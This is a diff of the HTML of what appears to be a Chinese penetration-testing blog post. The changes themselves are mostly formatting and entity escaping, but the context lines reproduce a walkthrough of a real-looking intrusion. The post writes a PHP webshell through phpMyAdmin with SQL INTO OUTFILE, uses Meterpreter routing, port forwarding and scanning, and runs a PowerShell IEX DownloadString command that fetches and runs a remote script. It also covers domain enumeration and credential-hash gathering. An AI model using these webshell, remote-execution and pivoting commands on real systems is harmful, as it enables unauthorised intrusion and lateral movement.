@@ -119,8 +119,8 @@
 <li>开放端口 - 发现开启了防火墙</li>
 </ul>
 <p>扫描到它存在<code>phpMyadmin</code>，弱口令登录进入，通过常规手法SQL写入shell。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;&lt;?php @assert($_POST[&#34;qyxmsq56dhaye3&#34;]);?&gt;&#39;</span> <span style="color:#66d9ef">INTO</span> OUTFILE <span style="color:#e6db74">&#39;D:/WWW/***/master/&#39;</span>;
-</code></pre></div><p>通过Webshell的方式进入，肯定是要直接看权限了，但是由于是他们的测试环境，权限相对比较高。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;&lt;?php @assert($_POST[&#34;qyxmsq56dhaye3&#34;]);?&gt;&#39;</span> <span style="color:#66d9ef">INTO</span> OUTFILE <span style="color:#e6db74">&#39;D:/WWW/***/master/&#39;</span>;
+</span></span></code></pre></div><p>通过Webshell的方式进入，肯定是要直接看权限了，但是由于是他们的测试环境，权限相对比较高。</p>
 <pre tabindex="0"><code>D:\WWW\***\master\&gt; net user /domain
 这项请求将在域 WORKGROUP 的域控制器处理。
 
@@ -376,7 +376,6 @@ OPTIONS:
     -A        自动启动一个匹配 exploit/multi/handler来连接服务
     -h        帮助菜单
     -r        卸载服务
-
 </code></pre><p>它是一个正向的连接，不适用于复杂的内网环境</p>
 <h2 id="0x04-端口转发之portfwd详解">0x04 端口转发之portfwd详解</h2>
 <pre tabindex="0"><code>meterpreter &gt; ifconfig
@@ -589,7 +588,7 @@ msf auxiliary(tcp) &gt;
 [*] AutoAddRoute: Routing new subnet 10.159.191.128/255.255.255.128 through session 9
 [*] AutoAddRoute: Routing new subnet 169.254.0.0/255.255.0.0 through session 9
 [*] AutoAddRoute: Routing new subnet 192.168.0.0/255.255.0.0 through session 9
-[-] The 'stdapi' extension has already been loaded.
+[-] The &#39;stdapi&#39; extension has already been loaded.
 msf auxiliary(tcp) &gt; sessions -i 9 
 [*] Starting interaction with 9...
 
@@ -661,7 +660,6 @@ msf auxiliary(tcp) &gt; run
 [+] 10.159.191.51:        - 10.159.191.51:22 - TCP OPEN
 [+] 10.159.191.50:        - 10.159.191.50:3306 - TCP OPEN
 ******
-
 </code></pre><h2 id="0x05-meterpreter">0x05 Meterpreter</h2>
 <h3 id="获取hash的几个方式">获取Hash的几个方式</h3>
 <blockquote>
@@ -758,8 +756,8 @@ Loading extension powershell...Success.
 meterpreter &gt; powershell_shell
 PS &gt; whoami
 nt authority\system
-PS &gt; IEX(New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&quot;);
-PS &gt; Invoke-Portscan -Hosts 10.159.63.2 -Ports &quot;21&quot;
+PS &gt; IEX(New-Object Net.WebClient).DownloadString(&#34;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#34;);
+PS &gt; Invoke-Portscan -Hosts 10.159.63.2 -Ports &#34;21&#34;
 
 
 Hostname      : 10.159.63.2
@@ -770,14 +768,13 @@ filteredPorts : {}
 finishTime    : 2017/12/28 17:19:46
 
 .....
-
 </code></pre><p>第二种办法：(先通过其他模块下载)</p>
 <pre tabindex="0"><code>meterpreter &gt; run post/windows/manage/download_exec URL=https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1
 
 [*] 41534 bytes downloaded to C:\Windows\TEMP\Invoke-Portscan.ps1 in 1 seconds 
 meterpreter &gt; powershell_shell 
 PS &gt; C:\Windows\TEMP\Invoke-Portscan.ps1
-PS &gt; Invoke-Portscan -Hosts 10.159.63.5 -Ports &quot;22&quot;
+PS &gt; Invoke-Portscan -Hosts 10.159.63.5 -Ports &#34;22&#34;
 
 
 Hostname      : 10.159.63.5
@@ -815,7 +812,7 @@ finishTime    : 2017/12/28 17:23:45
 [ProxyList]
 # add proxy here ...
 # meanwile
-# defaults set to &quot;tor&quot;
+# defaults set to &#34;tor&#34;
 socks5  ***.***.***.*** 1080
 </code></pre><p>开始扫描：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/f01e8b7e-4f5e-11ec-a1d4-00d861bf4abb.png" alt="扫描"></p>
@@ -856,7 +853,6 @@ IP地址2：192.168.10.3
 IP地址1：10.159.16.4
 IP地址2：192.168.10.4
 操作系统：Windows Server 2012
-
 </code></pre><p>根据之前搜集的子网来判断，我们所处于的内网中有很多域。并且能够可以和域控服务器通信，即使当前的服务器不在域中，也可以进行登录</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/f16d5668-4f5e-11ec-951e-00d861bf4abb.png" alt="域控3389"></p>
 <p>通过两层转发，我们尝试登录：</p>
